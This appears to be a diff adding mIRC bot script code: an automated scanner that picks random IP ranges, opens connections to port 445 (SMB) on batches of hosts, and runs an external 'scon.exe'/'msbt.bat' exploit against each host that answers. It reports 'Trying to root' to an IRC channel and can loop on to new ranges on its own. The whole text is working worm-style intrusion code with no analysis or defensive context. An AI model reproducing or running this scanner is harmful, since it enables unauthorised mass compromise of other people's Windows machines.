+  if %totalscaning == %total opensocks 74
+  set %ip75 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 75
+  set %ip76 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 76
+  set %ip77 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 77
+  set %ip78 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 78
+  set %ip79 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 79
+  set %ip80 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 80
+  set %ip81 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 81
+  set %ip82 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 82
+  set %ip83 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 83
+  set %ip84 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 84
+  set %ip85 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 85
+  set %ip86 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 86
+  set %ip87 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 87
+  set %ip88 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 88
+  set %ip89 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 89
+  set %ip90 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 90
+  set %ip91 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 91
+  set %ip92 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 92
+  set %ip93 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 93
+  set %ip94 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 94
+  set %ip95 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 95
+  set %ip96 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 96
+  set %ip97 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 97
+  set %ip98 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 98
+  set %ip99 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  if %totalscaning == %total opensocks 99
+  set %ip100 $longip($calc( %beglongip + %totalscaning ))
+  inc %totalscaning
+  opensocks
+}
+alias opensocks {
+  sockopen ip1 %ip1 445
+  if $1 == 1 finished
+  sockopen ip2 %ip2 445
+  if $1 == 2 finished
+  sockopen ip3 %ip3 445
+  if $1 == 3 finished
+  sockopen ip4 %ip4 445
+  if $1 == 4 finished
+  sockopen ip5 %ip5 445
+  if $1 == 5 finished
+  sockopen ip6 %ip6 445
+  if $1 == 6 finished
+  sockopen ip7 %ip7 445
+  if $1 == 7 finished
+  sockopen ip8 %ip8 445
+  if $1 == 8 finished
+  sockopen ip9 %ip9 445
+  if $1 == 9 finished
+  sockopen ip10 %ip10 445
+  if $1 == 10 finished
+  sockopen ip11 %ip11 445
+  if $1 == 11 finished
+  sockopen ip12 %ip12 445
+  if $1 == 12 finished
+  sockopen ip13 %ip13 445
+  if $1 == 13 finished
+  sockopen ip14 %ip14 445
+  if $1 == 14 finished
+  sockopen ip15 %ip15 445
+  if $1 == 15 finished
+  sockopen ip16 %ip16 445
+  if $1 == 16 finished
+  sockopen ip17 %ip17 445
+  if $1 == 17 finished
+  sockopen ip18 %ip18 445
+  if $1 == 18 finished
+  sockopen ip19 %ip19 445
+  if $1 == 19 finished
+  sockopen ip20 %ip20 445
+  if $1 == 20 finished
+  sockopen ip21 %ip21 445
+  if $1 == 21 finished
+  sockopen ip22 %ip22 445
+  if $1 == 22 finished
+  sockopen ip23 %ip23 445
+  if $1 == 23 finished
+  sockopen ip24 %ip24 445
+  if $1 == 24 finished
+  sockopen ip25 %ip25 445
+  if $1 == 25 finished
+  sockopen ip26 %ip26 445
+  if $1 == 26 finished
+  sockopen ip27 %ip27 445
+  if $1 == 27 finished
+  sockopen ip28 %ip28 445
+  if $1 == 28 finished
+  sockopen ip29 %ip29 445
+  if $1 == 29 finished
+  sockopen ip30 %ip30 445
+  if $1 == 30 finished
+  sockopen ip31 %ip31 445
+  if $1 == 31 finished
+  sockopen ip32 %ip32 445
+  if $1 == 32 finished
+  sockopen ip33 %ip33 445
+  if $1 == 33 finished
+  sockopen ip34 %ip34 445
+  if $1 == 34 finished
+  sockopen ip35 %ip35 445
+  if $1 == 35 finished
+  sockopen ip36 %ip36 445
+  if $1 == 36 finished
+  sockopen ip37 %ip37 445
+  if $1 == 37 finished
+  sockopen ip38 %ip38 445
+  if $1 == 38 finished
+  sockopen ip39 %ip39 445
+  if $1 == 39 finished
+  sockopen ip40 %ip40 445
+  if $1 == 40 finished
+  sockopen ip41 %ip41 445
+  if $1 == 41 finished
+  sockopen ip42 %ip42 445
+  if $1 == 42 finished
+  sockopen ip43 %ip43 445
+  if $1 == 43 finished
+  sockopen ip44 %ip44 445
+  if $1 == 44 finished
+  sockopen ip45 %ip45 445
+  if $1 == 45 finished
+  sockopen ip46 %ip46 445
+  if $1 == 46 finished
+  sockopen ip47 %ip47 445
+  if $1 == 47 finished
+  sockopen ip48 %ip48 445
+  if $1 == 48 finished
+  sockopen ip49 %ip49 445
+  if $1 == 49 finished
+  sockopen ip50 %ip50 445
+  if $1 == 50 finished
+  sockopen ip51 %ip51 445
+  if $1 == 51 finished
+  sockopen ip52 %ip52 445
+  if $1 == 52 finished
+  sockopen ip53 %ip53 445
+  if $1 == 53 finished
+  sockopen ip54 %ip54 445
+  if $1 == 54 finished
+  sockopen ip55 %ip55 445
+  if $1 == 55 finished
+  sockopen ip56 %ip56 445
+  if $1 == 56 finished
+  sockopen ip57 %ip57 445
+  if $1 == 57 finished
+  sockopen ip58 %ip58 445
+  if $1 == 58 finished
+  sockopen ip59 %ip59 445
+  if $1 == 59 finished
+  sockopen ip60 %ip60 445
+  if $1 == 60 finished
+  sockopen ip61 %ip61 445
+  if $1 == 61 finished
+  sockopen ip62 %ip62 445
+  if $1 == 62 finished
+  sockopen ip63 %ip63 445
+  if $1 == 63 finished
+  sockopen ip64 %ip64 445
+  if $1 == 64 finished
+  sockopen ip65 %ip65 445
+  if $1 == 65 finished
+  sockopen ip66 %ip66 445
+  if $1 == 66 finished
+  sockopen ip67 %ip67 445
+  if $1 == 67 finished
+  sockopen ip68 %ip68 445
+  if $1 == 68 finished
+  sockopen ip69 %ip69 445
+  if $1 == 69 finished
+  sockopen ip70 %ip70 445
+  if $1 == 70 finished
+  sockopen ip71 %ip71 445
+  if $1 == 71 finished
+  sockopen ip72 %ip72 445
+  if $1 == 72 finished
+  sockopen ip73 %ip73 445
+  if $1 == 73 finished
+  sockopen ip74 %ip74 445
+  if $1 == 74 finished
+  sockopen ip75 %ip75 445
+  if $1 == 75 finished
+  sockopen ip76 %ip76 445
+  if $1 == 76 finished
+  sockopen ip77 %ip77 445
+  if $1 == 77 finished
+  sockopen ip78 %ip78 445
+  if $1 == 78 finished
+  sockopen ip79 %ip79 445
+  if $1 == 79 finished
+  sockopen ip80 %ip80 445
+  if $1 == 80 finished
+  sockopen ip81 %ip81 445
+  if $1 == 81 finished
+  sockopen ip82 %ip82 445
+  if $1 == 82 finished
+  sockopen ip83 %ip83 445
+  if $1 == 83 finished
+  sockopen ip84 %ip84 445
+  if $1 == 84 finished
+  sockopen ip85 %ip85 445
+  if $1 == 85 finished
+  sockopen ip86 %ip86 445
+  if $1 == 86 finished
+  sockopen ip87 %ip87 445
+  if $1 == 87 finished
+  sockopen ip88 %ip88 445
+  if $1 == 88 finished
+  sockopen ip89 %ip89 445
+  if $1 == 89 finished
+  sockopen ip90 %ip90 445
+  if $1 == 90 finished
+  sockopen ip91 %ip91 445
+  if $1 == 91 finished
+  sockopen ip92 %ip92 445
+  if $1 == 92 finished
+  sockopen ip93 %ip93 445
+  if $1 == 93 finished
+  sockopen ip94 %ip94 445
+  if $1 == 94 finished
+  sockopen ip95 %ip95 445
+  if $1 == 95 finished
+  sockopen ip96 %ip96 445
+  if $1 == 96 finished
+  sockopen ip97 %ip97 445
+  if $1 == 97 finished
+  sockopen ip98 %ip98 445
+  if $1 == 98 finished
+  sockopen ip99 %ip99 445
+  if $1 == 99 finished
+  sockopen ip100 %ip100 445
+  timerscannerTE 1 12 sockclose ip*
+  timerscannerSA 1 15 startscan
+}
+alias randip {
+  unset %1p1 %1p2
+  set %1p1 $1-
+  set %1p2 $replace($gettok(%1p1,1,46),*,$rand(1,255))
+  set %1p2 %1p2 $+ . $+ $replace($gettok(%1p1,2,46),*,$rand(1,255))
+  set %1p2 %1p2 $+ . $+ $replace($gettok(%1p1,3,46),*,$rand(1,255))
+  set %1p2 %1p2 $+ . $+ $replace($gettok(%1p1,4,46),*,$rand(1,255))
+  return %1p2
+}
+alias randscan {
+  unset %1p1 %1p2
+  set %1p1 $rand(1,255) $+ . $+ $rand(1,255) $+ . $+ $rand(1,255) $+ . $+ $rand(1,255)
+  :set2
+  set %1p2 $rand(1,255) $+ . $+ $rand(1,255) $+ . $+ $rand(1,255) $+ . $+ $rand(1,255)
+  if ($gettok(%1p2,1,46) < $gettok(%1p1,1,46)) { goto set2 | halt }
+}
+on 1:sockopen:ip*:{ if ($sockerr > 0) { halt } | set %445 % [ $+ [ $sockname ] ] | run scon.exe /n /fh /r "msbt.bat   %445 $+ " | mell 15/07NT Scan:04 %445 07Trying to root15\ | inc %ttr | sockclose $sockname | unset %445 | halt }
+alias finished {
+  if (%auto != on) { mell 15/07NT Scan:04 %begshortip $+ - $+ %endshortip 07is finished15\ | sockclose ip* | unset %beg* | timers off | unset %end* | unset %ip* | unset %total* }
+  if (%auto == on) { mell 15/07NT Scan:04 %begshortip $+ - $+ %endshortip 07is finished!04 Now starting up new range15\ | sockclose ip* | timers off | unset %beg* | unset %end* | unset %ip* | unset %total* | randscan | set %begshortip %1p1 | set %endshortip %1p2 | set %beglongip $longip(  %begshortip ) | startscan | mell 15/07NT Scan:04 %begshortip $+ - $+ %endshortip 07Now Scanning15\  }
+}
